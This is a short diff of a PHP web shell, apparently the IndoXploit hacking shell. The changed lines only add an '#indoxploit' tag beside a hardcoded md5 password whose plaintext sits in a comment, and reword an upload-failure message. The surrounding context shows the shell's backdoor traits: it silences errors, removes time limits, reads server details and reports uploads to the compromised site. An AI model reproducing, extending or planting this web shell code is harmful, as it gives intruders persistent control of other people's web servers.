@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "86b033476fe11f37ad2cdbb40df5f258"; # md5: thedarkw3b
+$password = "86b033476fe11f37ad2cdbb40df5f258"; # md5: thedarkw3b #indoxploit
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
@@ -245,7 +245,7 @@ iframe {
 						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
 					} 
 					else {
-						$act = color(1, 1, "Failed to upload file!");
+						$act = color(1, 1, "Failed to upload file! Try Again");
 					}
 				} 
 				else {
